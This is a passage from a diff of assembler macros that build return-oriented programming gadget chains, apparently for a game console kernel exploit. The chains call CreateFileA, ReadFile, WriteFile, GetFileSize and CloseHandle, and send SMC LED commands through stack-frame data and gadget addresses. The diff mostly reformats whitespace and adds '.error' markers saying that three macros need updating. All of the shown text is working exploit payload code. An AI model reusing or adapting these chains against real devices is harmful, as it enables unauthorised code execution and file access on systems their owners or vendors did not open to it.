+		#	r3 = command buffer address
+		#	r4 = response = false
+		###########################################################
+		CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -589,6 +1068,8 @@
 .macro READ_FILE file_name, buffer_ptr, base_addr, offset
 
     read_file_base_addr = .
+	
+		.error "READ_FILE macro needs to be updated"
 
         ###########################################################
         # Gadget N: prologue
@@ -609,14 +1090,14 @@
         #
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - read_file_base_addr), \buffer_ptr
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: pre-load r3-r7 with argument values, this is required because some xam files (mainly 17559 retail)
-        #   will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
-        #   fail and CreateFileA will return an error code.
+		#	will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
+		#	fail and CreateFileA will return an error code.
         #
         ###########################################################
-        CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x80000000, R5H=0, R5L=0x00000001, R6H=0, R6L=0, R7H=0, R7L=0x00000003
+		CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x80000000, R5H=0, R5L=0x00000001, R6H=0, R6L=0, R7H=0, R7L=0x00000003
         .fill   0x50, 1, 0x00
         .long   0x31313131, 0x31313131              # r31
         .long   __restgprlr_26                      # lr
@@ -672,15 +1153,15 @@
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((1f + cf_r3_offset) - read_file_base_addr), read_file_handle
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r3_offset) - read_file_base_addr), read_file_handle
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - read_file_base_addr), read_file_handle
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call GetFileSize
         #
-        #   r3 = file handle (set by previous gadgets)
-        #   r4 = file size high = NULL
-        ###########################################################
-        CALL_FUNC 1, GetFileSize, R3H=0, R3L=0x41414141, R4H=0, R4L=0
-        .fill   0x50, 1, 0x00
+		#	r3 = file handle (set by previous gadgets)
+		#	r4 = file size high = NULL
+		###########################################################
+		CALL_FUNC 1, GetFileSize, R3H=0, R3L=0x41414141, R4H=0, R4L=0
+		.fill   0x50, 1, 0x00
         .long   0x00000000, read_file_size              # r31 - address to store file size at
         .long   stw_r3                                  # lr
         .long   0x00000000
@@ -701,24 +1182,24 @@
         #
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r5_offset) - read_file_base_addr), read_file_size
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call ReadFile
         #
-        #   r3 = file handle (set by previous gadgets)
-        #   r4 = buffer to read into (set by previous gadgets)
-        #   r5 = size to read (set by previous gadgets)
-        #   r6 = &read_file_bytes_read
-        #   r7 = NULL
-        ###########################################################
-        CALL_FUNC 2, ReadFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=0x41414141, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
-        
-        ###########################################################
+		#	r3 = file handle (set by previous gadgets)
+		#	r4 = buffer to read into (set by previous gadgets)
+		#	r5 = size to read (set by previous gadgets)
+		#	r6 = &read_file_bytes_read
+		#	r7 = NULL
+		###########################################################
+		CALL_FUNC 2, ReadFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=0x41414141, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
+		
+		###########################################################
         # Gadget N: call CloseFileHandle
         #
-        #   r3 = file handle
-        ###########################################################
-        CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
+		#	r3 = file handle
+		###########################################################
+		CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -744,6 +1225,8 @@
 .macro WRITE_FILE file_name, buffer_ptr, buffer_size, base_addr, offset
 
     write_file_base_addr = .
+	
+		.error "WRITE_FILE macro needs to be updated"
 
         ###########################################################
         # Gadget N: prologue
@@ -764,14 +1247,14 @@
         #
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - write_file_base_addr), \buffer_ptr
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: pre-load r3-r7 with argument values, this is required because some xam files (mainly 17559 retail)
-        #   will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
-        #   fail and CreateFileA will return an error code.
+		#	will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
+		#	fail and CreateFileA will return an error code.
         #
         ###########################################################
-        CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x40000000, R5H=0, R5L=0x00000000, R6H=0, R6L=0, R7H=0, R7L=0x00000002
+		CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x40000000, R5H=0, R5L=0x00000000, R6H=0, R6L=0, R7H=0, R7L=0x00000002
         .fill   0x50, 1, 0x00
         .long   0x31313131, 0x31313131              # r31
         .long   __restgprlr_26                      # lr
@@ -826,23 +1309,23 @@
         ###########################################################
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r3_offset) - write_file_base_addr), read_file_handle
         WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - write_file_base_addr), read_file_handle
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call WriteFile
         #
-        #   r3 = file handle (set by previous gadgets)
-        #   r4 = buffer to read into (set by previous gadgets)
-        #   r5 = size to write
-        #   r6 = &read_file_bytes_read
-        #   r7 = NULL
-        ###########################################################
-        CALL_FUNC 2, WriteFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=\buffer_size, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
-        
-        ###########################################################
+		#	r3 = file handle (set by previous gadgets)
+		#	r4 = buffer to read into (set by previous gadgets)
+		#	r5 = size to write
+		#	r6 = &read_file_bytes_read
+		#	r7 = NULL
+		###########################################################
+		CALL_FUNC 2, WriteFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=\buffer_size, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
+		
+		###########################################################
         # Gadget N: call CloseFileHandle
         #
-        ###########################################################
-        CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
+		###########################################################
+		CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -858,7 +1341,9 @@
 
 .macro STATUS_TO_LED zero_color, non_zero_color
 
-        ###########################################################
+		.error "STATUS_TO_LED needs to be updated"
+
+		###########################################################
         # Gadget N: prologue
         #
         #   addi    r1, r1, 0x60
@@ -869,202 +1354,202 @@
         ###########################################################
         .fill   0x50, 1, 0x00
         .long   0x00000000, arithmetic_scratch1     # r31
-        .long   clamp_not_r3                        # lr
+        .long   clamp_not_r3                      	# lr
         .long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: clamp r3
         #
-        #   cmplwi  r3, 0
-        #   li      r3, 1
-        #   beq     loc_81932E4C
-        #       li      r3, 0
-        #
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   blr
+        #	cmplwi	r3, 0
+		#	li		r3, 1
+		#	beq		loc_81932E4C
+		#		li		r3, 0
+		#
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   stw_r3                  # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	stw_r3					# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: store clamped result to scratch variable
         #
-        #   stw     r3, 0(r31)
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	stw		r3, 0(r31)
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x50, 1, 0x00
-        .long   0x31313131, 0x31313131  # r31
-        .long   __restgprlr_30          # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x31313131, 0x31313131	# r31
+		.long	__restgprlr_30			# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: setup for next gadget
         #
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	addi	r1, r1, 0x70
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x00000000, \zero_color << 8        # r30 - zero color value
-        .long   0x00000000, StatusToLedValues       # r31 - location to store led color value
-        .long   stw_r30_on_r31                      # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x00000000, \zero_color	<< 8		# r30 - zero color value
+		.long	0x00000000, StatusToLedValues		# r31 - location to store led color value
+		.long	stw_r30_on_r31						# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: store r3=0 led value
         #
-        #   stw     r30, 0(r31)
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	stw		r30, 0(r31)
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x00000000, \non_zero_color << 8    # r30 - non-zero color value
-        .long   0x00000000, StatusToLedValues + 4   # r31 - location to store led color value
-        .long   stw_r30_on_r31                      # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x00000000, \non_zero_color << 8	# r30 - non-zero color value
+		.long	0x00000000, StatusToLedValues + 4	# r31 - location to store led color value
+		.long	stw_r30_on_r31						# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: store r3!=0 led value
         #
-        #   stw     r30, 0(r31)
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	stw		r30, 0(r31)
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x30303030, 0x30303030                                      # r30
-        .long   0x00000000, StatusToLedValues + mul_r3_4_lwzx_r11__disp     # r31 - address to load from (with displacement for mul_r3_4_lwzx_r11 gadget)
-        .long   mr_r31_to_r11                                               # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x30303030, 0x30303030										# r30
+		.long	0x00000000, StatusToLedValues + mul_r3_4_lwzx_r11__disp		# r31 - address to load from (with displacement for mul_r3_4_lwzx_r11 gadget)
+		.long	mr_r31_to_r11												# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: setup r11 with address to StatusToLedValues
         #
-        #   mr      r11, r31
-        #   mr      r3, r11
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	mr		r11, r31
+		#	mr		r3, r11
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x30303030, 0x30303030              # r30
-        .long   0x00000000, arithmetic_scratch1     # r31 - address to load from
-        .long   lwz_r3                              # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x30303030, 0x30303030				# r30
+		.long	0x00000000, arithmetic_scratch1		# r31 - address to load from
+		.long	lwz_r3								# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: load clamped r3 value
         #
-        #   lwz     r3, 0(r31)
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, var_8(r1)
-        #   mtlr    r12
-        #   ld      r31, var_10(r1)
-        #   blr
+        # 	lwz		r3, 0(r31)
+		# 	addi	r1, r1, 0x60
+		# 	lwz		r12, var_8(r1)
+		# 	mtlr	r12
+		# 	ld		r31, var_10(r1)
+		# 	blr
         ###########################################################
-        .fill   0x50, 1, 0x00
-        .long   0x00000000, mul_r3_4_lwzx_r11       # r31 - function to call
-        .long   call_func_dispatch                  # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, mul_r3_4_lwzx_r11		# r31 - function to call
+		.long	call_func_dispatch					# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: load clamped r3 value
         #
-        #   mtctr   r31
-        #   bctrl
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x50, 1, 0x00
-        .long   0x31313131, 0x31313131      # r31
-        .long   __restgprlr_30              # lr
-        .long   0x00000000
-        
-        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x31313131, 0x31313131		# r31
+		.long	__restgprlr_30				# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: load color value
         #
-        #   slwi    r10, r3, 2
-        #   addi    r11, r11, 0x3D64
-        #   lwzx    r3, r10, r11
-        #   blr
+        #	slwi	r10, r3, 2
+		#	addi	r11, r11, 0x3D64
+		#	lwzx	r3, r10, r11
+		#	blr
         ###########################################################
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: setup for OR operation
         #
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	addi	r1, r1, 0x70
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x00000000, 0x99FF0000              # r30 - color command value
-        .long   0x31313131, 0x31313131              # r31
-        .long   0x818CB880                          # lr
+		.fill 	0x58, 1, 0x00
+		.long   0x00000000, 0x99FF0000     			# r30 - color command value
+        .long   0x31313131, 0x31313131				# r31
+        .long   0x818CB880                      	# lr
         .long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: OR the SMC led command with the color value chosen
         #
-        #   or      r3, r3, r30
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	or		r3, r3, r30
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r30, -0x18(r1)
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x30303030, 0x30303030              # r30
-        .long   0x00000000, smc_command_buffer      # r31 - address of command buffer
-        .long   stw_r3                              # lr
+		.fill 	0x58, 1, 0x00
+		.long	0x30303030, 0x30303030				# r30
+		.long   0x00000000, smc_command_buffer      # r31 - address of command buffer
+		.long   stw_r3                      		# lr
         .long   0x00000000
         
         ###########################################################
         # Gadget N: write led color override command to smc command buffer
         #
-        #   stw     r3, 0(r31)
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	stw		r3, 0(r31)
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call HalSendSMCMessage
         #
-        #   r3 = command buffer address
-        #   r4 = response = false
-        ###########################################################
-        CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
-        
-        ###########################################################
+		#	r3 = command buffer address
+		#	r4 = response = false
+		###########################################################
+		CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
+		
+		###########################################################
         # Gadget N: epilogue to be implemented by the caller
         #
         #   addi    r1, r1, 0x60
